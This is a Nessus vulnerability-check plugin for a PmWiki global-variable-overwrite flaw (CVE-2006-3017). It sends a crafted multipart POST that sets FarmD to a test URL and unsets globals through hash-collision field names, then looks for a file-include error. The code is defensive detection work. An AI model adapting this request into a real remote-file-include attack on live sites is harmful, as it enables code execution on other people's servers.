#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22310);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-3017");
  script_bugtraq_id(17843);
  script_xref(name:"OSVDB", value:"25255");

  script_name(english:"PmWiki < 2.1.21 Global Variables Overwrite Vulnerability");
  script_summary(english:"Checks for a remote file include flaw in PmWiki");

  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
global variable overwriting vulnerability. 

Description :

The version of PmWiki installed on the remote host contains a
programming flaw in 'pmwiki.php' that may allow an unauthenticated
remote attacker to overwrite global variables used by the application,
which could in turn be exploited to execute arbitrary PHP code on the
affected host, subject to the privileges of the web server user id. 

Note that successful exploitation of this issue requires that PHP's
'register_globals' and 'file_uploads' settings be enabled and that the
remote version of PHP be older than 4.4.3 or 5.1,4. 

See also :

http://www.hardened-php.net/hphp/zend_hash_del_key_or_index_vulnerability.html
http://www.pmwiki.com/wiki/PmWiki/ReleaseNotes

Solution :

Upgrade to PmWiki version 2.1.21 or later.

Risk factor :

Medium / CVSS Base Score : 4.8
(AV:L/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/pmwiki", "/wiki", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the affected script exists.
  url = string(dir, "/pmwiki.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("pmwiki.php?n=Main.RecentChanges" >< res)
  {
    # Try to exploit the flaw.
    FamD = string("http://127.0.0.1/NESSUS/", SCRIPT_NAME);
    boundary = "bound";
    req = string(	
      "POST ",  url, "?n=PmWiki.BasicEditing?action=edit HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="FarmD";', "\r\n",
      "\r\n",
      FamD, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="-1778478215";', "\r\n",
      "\r\n",
      "1\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="-1304181425";', "\r\n",
      "\r\n",
      "1\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see our FamD value in an error.
    if (string("main(", FamD, "/scripts/stdconfig.php): failed to open stream") >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
